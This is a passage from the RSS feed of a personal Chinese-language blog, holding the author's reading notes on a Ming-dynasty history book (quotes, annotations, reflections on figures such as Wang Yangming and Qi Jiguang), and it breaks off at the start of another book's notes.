&lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;《中庸》有云：&#xA;“国有道，不变塞焉，国无道，至死不变。”&#xA;无论这个世界多么混乱，坚持自己的信念。&#xA;我钦佩这样的人。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所谓历史，就是过去的事，它的残酷之处在于：无论你哀号、悲伤、痛苦、流泪、落寞、追悔，它都无法改变。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人只活一辈子，如何生活，都是自己的事，自己这辈子浑浑噩噩地没活好，厚着脸皮还来指责别人，有多远，就去滚多远。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;“男儿志在四方，当往天地间一展胸怀！”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;其实这个世上很多事，本不需要理由，之所以需要理由，是因为很多人喜欢找抽，抽久了，就需要理由了。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;因为我要告诉你，所谓千秋霸业，万古流芳，以及一切的一切，只是粪土。先变成粪，再变成土。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;成功只有一个——按照自己的方式，去度过人生。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;他人批注&#34;&gt;&lt;span&gt;他人批注&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e4%bb%96%e4%ba%ba%e6%89%b9%e6%b3%a8&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;成功学之所以是谬论，是由于当你成功时，说什么都会变为有价值的学问，无论真假，总有人相信。世界可以有完美的人设，但是没有完美的人生。每个人只是在有限的时间，用有限的认知作出了自认为最正确的选择，而这一切的结果都指向未知。&#xA;多年之后回首，回到当年命运的选择路口，你会选择不一样的路途么？另外一条路途会成就一个与现在截然不同的自己么？不一定的。那么时常把过往和后悔挂在嘴边，就是完全没有意义，苍白且无力的辩解。每个人可以抓住的，只有当下的日拱一卒。结果，留给时间评判。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;以利相交，利尽则散，以权相交，权失则弃。以色相交，色衰爱弛。言传身教、以身作则，是作为管理者的首要法则。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;你还很年轻，先不要去美化自己以后的路，先想想自己不愿意成为怎样的人，去看看他们的缺点，去引以为戒。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;周国平先生曾说过这样一段话，“人生有三次成长：第一次是在发现自己不再是世界中心的时候；第二次是在发现即使再怎么努力，终究还是有些事令人无能为力的时候；第三次是在明知道有些事可能会无能为力，但还是会尽力争取的时候。”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;时间教会了我们很多东西，有一些我们曾经深信不疑的，后来却发现其实它根本就没有，有一些我们认为没有的，后来才发现其实它确确实实存在。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;斯宾诺莎曾经说过，“诚实的人从来讨厌虚伪的人，而虚伪的人却常常以诚实的面目出现。”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;少时初读《送东阳马生序》，不以为意，长大后才明白，别说读书太苦，那是我们去看世界的路。恋爱过才读懂，年少时以为爱情是山盟海誓的热烈、是奋不顾身的勇敢，但如果爱的卑微，也终是遍体鳞伤。升学考公时才想起范进中举，最初嘲笑范进，后来理解范进，终是成为范进；找工作时才读懂孔乙己，脱不下的长衫不正是我们在所谓的体面和生活之间反复挣扎的高台吗？谈婚论嫁时才读懂孔雀东南飞，原来生活的酸甜苦辣，喜怒哀乐早已注定在各自的原生家庭中！人生好像就是这样，岁月匆匆如流水，初读不知书中意，再见已是书中人，可是回不去的何止是时间呀，遥远的又何止是距离呢？还有那些身边渐行渐远的人，和那个曾经风华的自己，所以我们如果无能为力，那就顺其自然吧；如果心无所侍，那就随遇而安吧。年轻时执着什么都不为过，成熟时放弃什么都不是错，最后，愿你历尽千帆，不染岁月风尘，听风八百遍，才知是人间。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;“世界上所有的爱都以聚合为最终目的，只有一种爱以分离为目的，那就是父母对子女的爱。父母真正成功的爱，就是让孩子尽早作为一个独立的个体从你的生命中分离出去，这种分离越早，你就越成功。”——纪伯伦&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;你欣赏的东西体现了你的品味和智趣，你讨厌的东西体现你的底线和原则。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;永远不要和一个智商低的人争论，他会把你的智商拉到和他一个水平，然后用丰富的经验打败你。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;永远不要为自己的不合群而内耗，总有人会欣赏你，会和你成为朋友。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;尼采曾说过，“越是向往高处的阳光，它的根就越要伸向黑暗的地底”。你不知道何为黑暗，也就不能明白光明的真正样子。正义向上的人，往往早已经看透了黑暗的本来面貌，在看透黑暗的本来面貌时仍能保持初心，那样才能是真正的正义向上。而强大的人必同时理解光明与黑暗的含义，向往光明的人，若不熟知何为黑暗，就会像根浅的树一样被人一推就倒。放到现实中就是：社会中有很多黑暗面，这些黑暗面往往带来了诱惑。当你像张白纸一样自称自己是正义的人时，其实你并不配正义二字。你只有真正的在了解黑暗面，仍能保持初心后，你才能配得上正义，才能成为强大的人。想当个好人，首先要明白何为坏人！&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所以历史经验告诉我们，做人就不要内耗了，你在别人眼里什么样，主要取决于对方的立场，而不取决于你。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;变通是为了做事，不变通是为了做人。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;想到杨绛先生关于看书的一句话：小的时候看书是为了了解这个世界，长大后才发现不了解这个世界根本看不懂书。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;要允许亲人撞南墙，要看着朋友走弯路，要目送爱人踩深坑，因为疼痛是最好的老师，而说教是最毒的仇恨。费尽力气把经历伤痛的感悟传递，帮助别人尽可能少走弯路，别人却不能领悟，而是仇恨。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;感悟&#34;&gt;&lt;span&gt;感悟&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%84%9f%e6%82%9f&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;明朝，最有气节的一个朝代，不和亲，不赔款，不割地。天子守国门，君王死社稷。&#xA;看完之后，对“实现中华民族伟大复兴”有了更深刻的理解。对比明朝和清朝，大致也理解了“前人无能，把中国搞成这样”所指。明朝的火器水平世界领先，抗倭援朝对日本降维打击，别人在玩枪我们就玩炮了。&lt;/p&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;p&gt;看完之后，我觉得最大的收获，大概是知道了自己想怎么活，想成为什么样的人。&lt;/p&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;p&gt;记录一下让我印象深刻的部分人物：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;王阳明，真正的圣贤，当之无愧。知行合一；“此心光明，亦复何言”；“天下之大，虽离家万里，何处不可往！何事不可为！”；“此心不动，随机而行。”；心如止水者，虽繁华纷扰之世间红尘，已然空无一物。&lt;br&gt;&lt;/li&gt;&#xA;&lt;li&gt;杨继盛，有种，实在太有种了。“他没有麻药，也不用铁环，更没有塞嘴的白毛巾，只是带着一副平静的表情，不停地刮着腐肉，碗片并不锋利，腐肉也不易割断，这是令人难以忍受的剧烈疼痛，然而，杨继盛没有发出一点儿声音”。“杨继盛继续着他的工作，腐肉已经刮得差不多了，骨头露了出来，他开始截去附在骨头上面的筋膜”。&lt;br&gt;&lt;/li&gt;&#xA;&lt;li&gt;杨涟，千年之下，终究不朽。不求钱财，不求富贵，不求青史留名，有慨然雄浑之气，万刃加身不改之志。&lt;br&gt;&lt;/li&gt;&#xA;&lt;li&gt;李时珍，见过最穷的贫民，也看过最富的天子，到过寒酸的茅舍，也走过金銮大殿，人世间的富贵、疾苦他已了然于胸。抛弃荣华富贵，历经困苦三十年著书救人的唯一动机与目的：“因为我本来就是个医生啊！”&lt;br&gt;&lt;/li&gt;&#xA;&lt;li&gt;于谦，身居高位却清廉正直，在这个污浊的世界上，能够干干净净的度过自己的一生&lt;/li&gt;&#xA;&lt;li&gt;戚继光，少年时写下他的理想：小筑暂高枕，忧时旧有盟。呼樽来揖客，挥麈坐谈兵。云护牙签满，星含宝剑横。封侯非我意，但愿海波平。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;p&gt;收集一下金句：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;庄子的儿子——庄（装）孙子&lt;/li&gt;&#xA;&lt;li&gt;他只有两件事不会，这也不会，那也不会&lt;/li&gt;&#xA;&lt;li&gt;八窍通了七窍——一窍不通&lt;/li&gt;&#xA;&lt;li&gt;麻雀啄牛屁股——确实牛逼&lt;/li&gt;&#xA;&lt;li&gt;铁哥们儿，也是会生锈的&lt;/li&gt;&#xA;&lt;li&gt;无论是铁哥们儿，还是钛哥们儿，在利益面前，都是一脚蹬&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;p&gt;最后再重复一遍书中的一句话：成功只有一个——按照自己的方式，去度过人生。&lt;/p&gt;</description>
    </item>
    <item>
      <title>《政治的人生》</title>
      <link>http://localhost:1313/posts/read_zzdrs/</link>
      <pubDate>Tue, 13 Jan 2026 02:13:53 +0800</pubDate>
      <guid>http://localhost:1313/posts/read_zzdrs/</guid>
      <category domain="http://localhost:1313/categories/reading/">Reading</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;摘录&#34;&gt;&lt;span&gt;摘录&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%91%98%e5%bd%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;生活在这个世界上的人：有的是弱者；有的是强者；有的要别人来设定目标，有的给别人设定目标；有的需要感情支持生活，有的需要意志支持生活。我大概在每一对概念中都会选择做后一种人。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;生活在今天的人，常常说前人无能，把中国搞成这样，我们希望以后的中国人不会说今天的中国人无能，把中国搞成这样。这是我最大的愿望。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div 